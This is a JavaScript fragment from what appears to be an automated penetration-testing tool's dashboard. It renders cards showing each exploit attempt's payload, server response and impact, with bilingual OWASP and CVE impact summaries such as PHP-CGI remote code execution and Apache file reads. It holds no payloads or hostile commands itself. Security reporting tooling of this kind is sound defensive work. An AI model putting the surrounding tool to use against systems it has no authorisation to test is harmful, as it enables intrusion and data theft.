const _SEVVAR={critical:"var(--crit)",high:"var(--high)",medium:"var(--med)",low:"var(--low)",info:"var(--info)"};
function phaseChip(a){
  if(!a.phase) return "";
  const col=a.success?(_SEVVAR[a.severity]||"var(--info)"):"var(--muted)";
  return `<span class="pchip"><span class="pdot" style="background:${col}"></span>${esc(phaseLabel(a.phase))}</span>`;
}

/* ---------- exploit verification: readable "what / payload / result / effect" ----------
   Turns a raw attempt into a human-readable card answering: what vuln, what
   payload was sent, what came back, and what an attacker could actually do. */
const IMPACT = {   // generic "what it enables" by OWASP class (en/zh)
  A01:{en:"Access or act on other users' data and functions without authorization.",zh:"越权访问或操作其他用户的数据与功能。"},
  A02:{en:"Read or tamper with data that should be protected by cryptography.",zh:"读取或篡改本应被加密保护的数据。"},
  A03:{en:"Inject code or commands the server runs — often full remote code execution.",zh:"注入由服务器执行的代码或命令——通常可达远程代码执行。"},
  A04:{en:"Abuse an insecure design to reach unintended, high-impact states.",zh:"利用不安全设计到达非预期的高危状态。"},
  A05:{en:"Leverage a misconfiguration to widen access or leak internals.",zh:"借助配置错误扩大访问面或泄露内部信息。"},
  A06:{en:"Exploit a known-vulnerable component via its public CVE.",zh:"针对已知漏洞组件,利用其公开 CVE。"},
  A07:{en:"Authenticate as another user or bypass the login controls.",zh:"冒充他人身份或绕过登录控制。"},
  A08:{en:"Tamper with data or updates whose integrity is never verified.",zh:"篡改未经完整性校验的数据或更新。"},
  A09:{en:"Act without being logged, hindering detection and response.",zh:"行动不被记录,妨碍检测与响应。"},
  A10:{en:"Make the server reach internal-only systems on your behalf (SSRF).",zh:"迫使服务器代为访问仅限内部的系统(SSRF)。"},
};
const IMPACT_CVE = {   // concrete effect for specific CVEs
  "CVE-2024-4577":{en:"Run arbitrary system commands on the server (PHP-CGI RCE) — full server takeover.",zh:"在服务器上执行任意系统命令(PHP-CGI RCE)——可完全接管服务器。"},
  "CVE-2021-41773":{en:"Read any file the web server can reach — /etc/passwd, source code, secrets.",zh:"读取 Web 服务可访问的任意文件——/etc/passwd、源码、密钥等。"},
  "CVE-2021-42013":{en:"Read any server-side file, and on some builds execute commands.",zh:"读取服务端任意文件,部分版本下还可执行命令。"},
};
function cveOf(a){
  const m=((a.technique||"")+" "+(a.objective||"")+" "+(a.evidence||"")+" "+(a.rationale||""))
          .match(/CVE-\d{4}-\d{3,7}/i);
  return m?m[0].toUpperCase():"";
}
function impactOf(a){
  const L=zh()?"zh":"en", cve=cveOf(a);
  if(cve && IMPACT_CVE[cve]) return IMPACT_CVE[cve][L];
  const tq=(a.technique||"").toLowerCase();
  if(tq.includes("sql"))                      return zh()?"读取或篡改数据库中的任意数据(数据泄露)。":"Read or modify arbitrary database data (data breach).";
  if(tq.includes("shell")||tq.includes("cmd")||tq.includes("command")) return zh()?"在服务器上执行任意系统命令。":"Execute arbitrary OS commands on the server.";
  if(tq.includes("template"))                 return zh()?"通过模板引擎执行代码(常可达 RCE)。":"Execute code through the template engine (often RCE).";
  if(tq.includes("xss")||tq.includes("marker"))return zh()?"在受害者浏览器中执行脚本,劫持其会话。":"Run script in a victim's browser and hijack their session.";
  if(tq.includes("idor")||tq.includes("enum"))return zh()?"枚举并读取其他用户的私密数据。":"Enumerate and read other users' private data.";
  if(tq.includes("ssrf")||tq.includes("metadata"))return zh()?"迫使服务器访问内部服务或云元数据。":"Force the server to reach internal services or cloud metadata.";
  return (IMPACT[a.owasp]||{})[L] || "";
}
function payloadOf(a){
  const req=(a.steps||[]).find(s=>s.role==="request"||s.role==="attack")||null;
  return req ? (req.prompt||"") : "";
}
function resultOf(a){
  if(a.evidence) return a.evidence;
  const req=(a.steps||[]).find(s=>s.role==="request")||((a.steps||[])[0]||{});
  return (req.response||"").slice(0,220);
}
function isExploit(a){
  if(["plan","report","validate"].includes(a.phase)) return false;
  if((a.technique||"").startsWith("verify:")) return true;
  if(a.phase==="exploit") return true;
  return (a.steps||[]).some(s=>s.role==="request");
}
function exploitCard(a){
  const cve=cveOf(a), imp=impactOf(a), pay=payloadOf(a), res=resultOf(a), ok=a.success;
  return `<div class="vcard ${ok?'ok':'no'}">
    <div class="vrow"><div class="vk">${t("vc.vuln")}</div><div class="vv">
       <b>${esc(techLabel(a.probe||a.technique))}</b>
       <span class="badge sev-${a.severity}">${sevLabel(a.severity)}</span>
       ${cve?`<span class="tag">${cve}</span>`:""}${a.owasp?`<span class="tag">${a.owasp}</span>`:""}</div></div>
    ${pay?`<div class="vrow"><div class="vk">${t("vc.payload")}</div><div class="vv"><pre class="pay">${esc(pay)}</pre></div></div>`:""}
    <div class="vrow"><div class="vk">${t("vc.result")}</div><div class="vv">
       <span class="rslt ${ok?'ok':'no'}">${ok?("✔ "+t("vc.confirmed")):("✘ "+t("vc.notconf"))}</span>
       ${res?`<pre class="pay">${esc(res)}</pre>`:""}</div></div>
    ${imp?`<div class="vrow"><div class="vk">${t("vc.impact")}</div><div class="vv imp">${esc(imp)}</div></div>`:""}
  </div>`;
}

/* ---------- start ---------- */
applyI18n();
if (S.token) boot();
